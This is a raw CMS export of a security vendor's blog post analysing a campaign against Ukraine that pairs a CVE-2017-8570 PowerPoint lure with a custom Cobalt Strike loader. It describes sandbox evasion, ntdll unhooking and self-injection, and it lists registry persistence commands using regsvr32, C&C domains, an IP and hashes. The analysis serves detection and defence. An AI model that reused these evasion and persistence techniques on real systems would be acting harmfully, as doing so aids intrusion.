src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt52ebfe0b956dc5cf/662980f3528fc1517055be22/fig11-check_vm.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 11: Checks if the malware executed inside a VM\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eIf this condition is \u003cstrong\u003efalse\u003c/strong\u003e, it simply \u003cstrong\u003eexits\u003c/strong\u003e, but the interesting thing is that it performs this check in other places. This includes a check at \u003cstrong\u003eDllEntryPoint\u003c/strong\u003e (executed before \u003cstrong\u003eDllRegisterServer)\u003c/strong\u003e, which assigns a global variable that can later change some of the behavior.\u003c/p\u003e\u003ch6\u003e\u003cem\u003eUnhooking \u003c/em\u003e\u003cem\u003e\u003cstrong\u003eNTDLL \u003c/strong\u003e\u003c/em\u003e\u003cem\u003e(Anti-AM)\u003c/em\u003e\u003c/h6\u003e\u003cp\u003eThe dynamic link library \u003cstrong\u003entdll.dll\u003c/strong\u003e is the lowest-level Windows API call interface between User Mode and Kernel Mode.\u003c/p\u003e\u003cp\u003eBecause of that, anti-malware vendors usually place hooks inside various calls to monitor for malicious behavior. If malware wants to avoid detection, it needs to find a way to circumvent these protections.\u003c/p\u003e\u003cp\u003eThe idea is straightforward: a pre-loaded ntdll.dll in memory contains inline hooks inside various API calls, which the malware needs to bypass or overwrite to avoid detection.\u003c/p\u003e\u003cp\u003eIn the screenshot below, we can see a memory mapping of \u003cstrong\u003entdll.dll\u003c/strong\u003e from \u003cstrong\u003edisk\u003c/strong\u003e, together with the fetching of the \u003cstrong\u003eloaded module \u003c/strong\u003eof \u003cstrong\u003entdll.dll\u003c/strong\u003e from the memory of the running process:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltac0a764a87f7a127\" alt=\"fig12-loading_both_dlls.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltac0a764a87f7a127/662980f4e7ce95a585deac72/fig12-loading_both_dlls.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 12: Loading both ntdlls\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThey are called:\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cstrong\u003eMemNTDLL : \u003c/strong\u003efor the loaded module from memory\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eDiskNTDLL : \u003c/strong\u003efor the copy of ntdll.dll from disk\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eThis looks like obvious unhooking, but the rest of the code was overwhelmingly complicated, and for some reason, it didn’t unhook in our tests.\u003c/p\u003e\u003cp\u003eIt took some time, and after digging deeper, we’ve encountered a couple of additional tricks the malware authors did to slow analysis.\u003c/p\u003e\u003cp\u003eI’ve divided these delaying techniques into several points:\u003c/p\u003e\u003cp\u003e\u003cstrong\u003e1.\u0026nbsp;Over-complicated bloat code\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eIt’s difficult to understand the exact purpose, but\u003cstrong\u003e \u003c/strong\u003ewe suspect it was done intentionally to waste threat analysts’ time, as we can see in the example code below:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt52d92beb3dd8d7dc\" alt=\"fig13-nonsense_code.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt52d92beb3dd8d7dc/662980f3fb977c0c1936bba6/fig13-nonsense_code.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 13: Nonsense code\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThis piece of code is called from the function responsible for unhooking ntdll.dll, and the variables \u003cstrong\u003elp_text_base_DiskNTDLL/MemNTDLL\u003c/strong\u003e are LONG_PTR addresses of both DLLs in memory.\u003c/p\u003e\u003cp\u003eBecause \u003cstrong\u003eMemNTDLL\u003c/strong\u003e always wants to be loaded by the operating system at the highest User Space module address – 0x77000000 (32-bit) above – with some variation due to ASLR, the condition \u003cstrong\u003elp_text_base_DiskNTDLL\u003c/strong\u003e \u0026gt; \u003cstrong\u003elp_text_base_MemNTDLL\u003c/strong\u003e would \u003cstrong\u003enever\u003c/strong\u003e be true.\u003c/p\u003e\u003cp\u003eAt least from this context.\u003c/p\u003e\u003cp\u003eThis function also gets called from other locations full of bloat code, not related to unhooking.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003e2. Hidden additional VM check (as mentioned above)\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt7c9186bdd9ac1ad2\" alt=\"fig14-DllEntryPoint_CPUID.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt7c9186bdd9ac1ad2/662980f3b8b5ce2379dc2937/fig14-DllEntryPoint_CPUID.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 14: DllEntryPoint check VM\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eIf the check is \u003cstrong\u003efalse\u003c/strong\u003e, it does not unhook and instead diverts the execution flow into ... can you guess?\u003c/p\u003e\u003cp\u003eMore bloat code:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt37ed9ef14f6b2947\" alt=\"fig15-unhook_and_bloat_code.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt37ed9ef14f6b2947/662980f458ce882287c30d71/fig15-unhook_and_bloat_code.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 15: Unhook and bloat code\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eMalware developers are known to create dummy behavior to slow down analysis.\u003c/p\u003e\u003cp\u003eIt’s an effective trick, and knowing that, it’s better to move on without diving into overly complicated code with no clear purpose, especially if it doesn’t get executed under normal conditions.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003e3. Structs with manual offsets\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eThe authors also used arbitrary offsets while manually loading various PE structures to make the reconstruction more difficult:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltaf62504dce96670d\" alt=\"fig16-arbitrary_offsets.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltaf62504dce96670d/6629810824e18134c8acf093/fig16-arbitrary_offsets.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 16: Arbitrary offsets\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eAfter reconstruction, it’s easier to see that it looks for the \u003cstrong\u003e.text\u003c/strong\u003e section (containing all the function implementations), changes the permissions to \u003cstrong\u003ePAGE_EXECUTE_READWRITE\u003c/strong\u003e, and then sends it to be overwritten with the original ntdll.dll:IOCs:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltb64ca9b06ed14593\" alt=\"fig17-after_reconstruction.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltb64ca9b06ed14593/66298108b0544189de9a07a9/fig17-after_reconstruction.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 17: After reconstruction\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003ch6\u003e\u003cem\u003eDecrypts Payload (Cobalt Strike)Network\u003c/em\u003e\u003c/h6\u003e\u003cp\u003eUses a standard decryption routine\u003c/p\u003e\u003cul\u003e\u003cli\u003eHash base_data/key_seed\u003c/li\u003e\u003cli\u003eDerive key from hash\u003c/li\u003e\u003cli\u003eDecrypt:\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt2dcc6aab23066577\" alt=\"fig18-decrypt_payload.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt2dcc6aab23066577/66298108ca8874915ded46c8/fig18-decrypt_payload.jse.png\" width=\"auto\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 18: Decrypt payload (Beacon)\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003ch6\u003e\u003cem\u003eSelf-DLL Injects Cobalt Strike\u003c/em\u003e\u003c/h6\u003e\u003cp\u003eThis is meant to hide the payload, avoid storing the file on disk (file-less), bypass remote injection heuristics, and, as always, complicate the analysis.\u003c/p\u003e\u003cp\u003eThe procedure is as follows:\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cstrong\u003eOpenProcess\u003c/strong\u003e\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eAllocateMemory\u003c/strong\u003e inside it\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eWriteProcessMemory\u003c/strong\u003e with the payload\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eCreateRemoteThread\u003c/strong\u003e inside itself\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eWaitForSingleObject\u003c/strong\u003e until that thread finishes\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt4284fcffd11b6423\" alt=\"fig19-self_dll_injection.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt4284fcffd11b6423/66298108a02ad7fa87eea4c7/fig19-self_dll_injection.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 19: Self DLL injection\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003ch6\u003e\u003cem\u003eExtracted Cobalt Strike Config:\u003c/em\u003e\u003c/h6\u003e\u003cp\u003eThe Cobalt Strike config contains a public key for asymmetric key exchange for encrypted communications with the C\u0026amp;C.\u003c/p\u003e\u003cp\u003eThe \u003cstrong\u003elicence_id : 0\u003c/strong\u003e indicates that this is a cracked version of Cobalt Strike.\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt1b287ae7003870ef\" alt=\"fig20-ExtractedConfig.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt1b287ae7003870ef/6629867f81c8845dde38064c/fig20-ExtractedConfig.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 20: Extracted config\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe Cobalt Beacon has a detailed config with the C\u0026amp;C address/domain name, URI, public key, and even the process that it would inject into (dllhost.exe).\u003c/p\u003e\u003cp\u003eIt awaits instruction from the C\u0026amp;C server, located at \u003cstrong\u003epetapixel[.]fun\u003c/strong\u003e (disguised as a popular photography site), also hidden behind Cloudflare, and registered in an EU country with GDPR masking, making it more difficult to investigate.\u003c/p\u003e\u003cp\u003eIt did mention it was registered in \u003cstrong\u003eWarsaw, Poland\u003c/strong\u003e.\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt0180209fb534a61f\" alt=\"fig21-location.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt0180209fb534a61f/6629867f210d90e2833a5678/fig21-location.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 21: Registration location\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003ch5\u003eConclusion\u003c/h5\u003e\u003cp\u003eThe Deep Instinct Threat Lab could not attribute these attacks to any known threat actor or exclude the possibility that this was part of a red team exercise.\u003c/p\u003e\u003cp\u003eThe evidence shows that this sample was uploaded from Ukraine, the second stage (weavesilk[.]space) was hosted and registered under a Russian VPS provider, and the Cobalt beacon C\u0026amp;C (petapixel[.]fun) was registered in Warsaw, Poland.\u003c/p\u003e\u003cp\u003eThe binary (\u003cem\u003evpn.sessings\u003c/em\u003e) contains a custom loader/packer for the Cobalt Strike Beacon with various techniques to slow analysis and \u003ca href=\"/endpoint-detection-response\" target=\"_self\"\u003ebypass cybersecurity solutions\u003c/a\u003e. Most of the techniques are not new but could be unique enough to be used as a fingerprint.\u003c/p\u003e\u003cp\u003eThe Cobalt Strike Beacon by itself is a professional pen-testing tool designed for evaluating computer security by red teams, but this is the leaked cracked version, so we can’t trace it to any legitimate user.\u003c/p\u003e\u003cp\u003eCobalt is an advanced tool with a wide range of capabilities, such as stealing sensitive data, elevating privileges, propagating to other computers in the network, downloading tools, and more. Without additional clues, it’s hard to understand the exact purpose of the attack.\u003c/p\u003e\u003cp\u003eThe lure contained military-related content, suggesting it was targeting military personnel. But the domain names weavesilk[.]space and petapixel[.]fun are disguised as an obscure generative art site (http://weavesilk.com) and a popular photography site (https://petapixel.com). These are unrelated, and it’s a bit puzzling why an attacker would use these specifically to fool military personnel.\u003c/p\u003e\u003cp\u003e\u003cp\u003eAs of the day of discovery, the loader was undetectable by most engines, while Deep Instinct prevented it on day 0.\u003c/p\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003ch6\u003eMITRE\u003c/h6\u003e\u003ctable style=\"width: 100%;\"\u003e\u003ccolgroup data-width='651.004557013671'\u003e\u003ccol style=\"width:21.351778648221355%\"/\u003e\u003ccol style=\"width:16.436283563716437%\"/\u003e\u003ccol style=\"width:21.65897834102166%\"/\u003e\u003ccol style=\"width:40.55295944704055%\"/\u003e\u003c/colgroup\u003e\u003cthead class=\"bg-grey\"\u003e\u003ctr\u003e\u003cth\u003e\u003cp\u003eTactic\u003c/p\u003e\u003c/th\u003e\u003cth\u003e\u003cp\u003eTechnique\u003c/p\u003e\u003c/th\u003e\u003cth\u003e\u003cp\u003eDescription\u003c/p\u003e\u003c/th\u003e\u003cth\u003e\u003cp\u003eObservable\u003c/p\u003e\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eInitial Access\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1566\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003ePhishing\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003ePowerPoint signal-2023-12-20-160512.ppsx containing RELS exploit\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eExecution\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1059.007\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eCommand and Scripting Interpreter: JavaScript\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003ewidget_iframe.617766616773726468746672726a6834.html containing obfuscated JavaScript\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003ePersistence\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1547.001\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eRegistry Run Keys\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eHKCU\\Software\\Microsoft\\Windows\\CurrentVirsion\\Run: cmd /Q /C whoami\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003ePersistence\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003e\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eEvent-Triggered Execution\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003e\u003cem\u003eHKCU\\Software\\Microsoft\\Command Processor\\AutoRun: start regsvr32 /s C:\\\u0026lt;path\u0026gt;\\vpn.sessings\u003c/em\u003e\u003c/p\u003e\u003cp\u003eNew sub-technique submitted to MITRE\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eDefensive Evasion\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1218.010\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eSystem Binary Proxy Execution:\u0026nbsp;Regsvr32\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003estart regsvr32 /s C:\\\u0026lt;path\u0026gt;\\vpn.sessings\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eDefensive Evasion\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1055\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eProcess Injection\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003ePerformed a self-injection after unpacking the Cobalt Strike Beacon, using the classic \u003cstrong\u003eCreateRemoteThread\u003c/strong\u003e method\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eDefensive Evasion\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1027.002\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eSoftware Packing\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eUnpacked the Cobalt Beacon using \u003cstrong\u003eCryptDecrypt\u003c/strong\u003e\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eDiscovery\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1057\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eProcess Discovery\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eIterated the running processes to terminate its parent for anti-debugging\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eDefensive Evasion\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1497\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eVirtualization/Sandbox Evasion\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003ePerformed \u003cstrong\u003eNtDelayExecution\u003c/strong\u003e to stall execution, possibly to evade automatic sandbox emulation by exploiting time constraints\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eCommand and Control\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eT1573\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eEncrypted Channel\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003eC\u0026amp;C communication using HTTPS on port 443\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003cp\u003e\u003c/p\u003e\u003ch6\u003eIOCs\u003c/h6\u003e\u003cp\u003eweavesilk[.]space\u003cbr /\u003e109.107.178[.]241\u003cbr /\u003epetapixel[.]fun\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003ctable style=\"width: 100%;\"\u003e\u003cthead class=\"bg-grey\"\u003e\u003ctr\u003e\u003cth\u003e\u003cp\u003eSHA256\u003c/p\u003e\u003c/th\u003e\u003cth\u003e\u003cp\u003eDescription\u003c/p\u003e\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eb0b762106c22e44f7acaa3177baabd64ea28990d16672e1f902b53f49b2027c4\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003esignal-2023-12-20-160512.ppsx\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003e0bc0e9410f4a9703ff0b5af7ec9383a1cc929572ade09fbd2c69ed2ae1486939\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003ewidget_iframe.617766616773726468746672726a6834.html\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003e976f57442452cd54cada011c565ada0c01f5b1460e31ee6cea330d210d3e8f50\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003evpn.sessings (cobalt strike loader DLL)\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003cp\u003e\u003c/p\u003e","_metadata":{"uid":"cs940cbd265a2c1788"}}}],"publication_date":"2024-04-25T13:30:00.000Z","seo":{"seo_title":"Uncorking Old Wine: Zero-Day from 2017 + Cobalt Strike Loader in Unholy Alliance","seo_metakeywords":"","seo_metadescription":"The Deep Instinct Threat Lab discovered a suspected targeted operation against Ukraine, using CVE-2017-8570 as the initial vector. The operation, which could not be attributed to any known threat actor, employed a custom loader for Cobalt Strike Beacon. Deep Instinct is detecting all stages of the attack.","image":{"uid":"blt61c3dfc7363deead","_version":2,"parent_uid":"blt764e72be29b68998","created_by":"bltdc505b576b8af7b9","updated_by":"bltdc505b576b8af7b9","created_at":"2024-04-24T21:56:51.505Z","updated_at":"2024-04-24T21:57:50.434Z","content_type":"image/png","file_size":"1261530","filename":"ThreatResearchTeam_Blog_1200x627_C.png","title":"DI_Uncorking Old Wine_TRT","ACL":{},"is_dir":false,"tags":[],"publish_details":{"time":"2024-04-25T14:13:40.520Z","user":"bltdc505b576b8af7b9","environment":"blt1b1ee2a5b0429c28","locale":"en-us"},"url":"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt61c3dfc7363deead/6629802381c884594a38061c/ThreatResearchTeam_Blog_1200x627_C.png"},"hide":false},"tags":[],"title":"Uncorking Old Wine: Zero-Day from 2017 + Cobalt Strike Loader in Unholy Alliance","updated_at":"2024-04-25T16:58:59.476Z","updated_by":"bltdc505b576b8af7b9","url":"/blog/uncorking-old-wine-zero-day-cobalt-strike-loader","publish_details":{"time":"2024-04-25T16:59:17.490Z","user":"bltdc505b576b8af7b9","environment":"blt1b1ee2a5b0429c28","locale":"en-us"},"processed_blocks":[{"name":"richtext_block","content":{"id":"cs940cbd265a2c1788","body":"\u003ch5\u003eExecutive Summary\u003c/h5\u003e\u003cul\u003e\u003cli\u003eThe Deep Instinct Threat Lab discovered a suspected targeted operation against Ukraine\u003c/li\u003e\u003cli\u003eThe operation is using CVE-2017-8570 as the initial vector\u003c/li\u003e\u003cli\u003eThe operation could not be attributed to any known threat actor\u003c/li\u003e\u003cli\u003eThe operation used a custom loader for Cobalt Strike Beacon\u003c/li\u003e\u003cli\u003eDeep Instinct is detecting all stages of the attack\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003ch5\u003eCampaign Overview\u003c/h5\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltc1c7893c1561616d\" alt=\"fig1-campaign-attack-flow.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltc1c7893c1561616d/662980cc81c884147c380620/fig1-campaign-attack-flow.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 1: Campaign overview\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eDeep Instinct Threat Lab observed a malicious PPSX file uploaded from Ukraine to VirusTotal at the end of 2023:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt9b1f379f0880a620\" alt=\"fig2_vt_upload.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt9b1f379f0880a620/662980cbb0ec774e92d6ebe3/fig2_vt_upload.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 2: VT upload information\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe file name suggests that it was shared via the Signal application; however, this doesn’t necessarily mean the file was initially sent to the victim via the application.\u003c/p\u003e\u003cp\u003eThe PPSX (PowerPoint Slideshow) file appears to be an old instruction manual of the US Army for mine clearing blades (MCB) for tanks.\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt8076071cddf4d2cb\" alt=\"fig3_ppsx_image.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt8076071cddf4d2cb/662980cc4da2a96906ff3317/fig3_ppsx_image.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 3: PPSX content\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe PPSX file includes a remote relationship to an external OLE object:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltdd378bc3103691ce\" alt=\"fig4_remote_relationship.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltdd378bc3103691ce/662980cbca88748093ed46c4/fig4_remote_relationship.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 4: Remote relationship\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe use of the “script:” prefix before the https URL indicates the use of \u003ca href=\"https://justhaifei1.blogspot.com/2017/07/bypassing-microsofts-cve-2017-0199-patch.html\"\u003eCVE-2017-8570,\u003c/a\u003e which is a bypass to the more known \u003ca href=\"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0199\"\u003eCVE-2017-0199\u003c/a\u003e.\u003c/p\u003e\u003cp\u003eThe remote script, which is named \"widget_iframe.617766616773726468746672726a6834.html,” was hosted at the domain “weavesilk[.]space,” which is protected by CloudFlare. However, during our analysis, we managed to identify the real hosting behind the domain, which is a Russian VPS provider:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltc6124aad899ad56e\" alt=\"fig5_real_ip.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltc6124aad899ad56e/662980cbb05441820e9a07a0/fig5_real_ip.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 5: Real domain IP\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe contents of the scriptlet 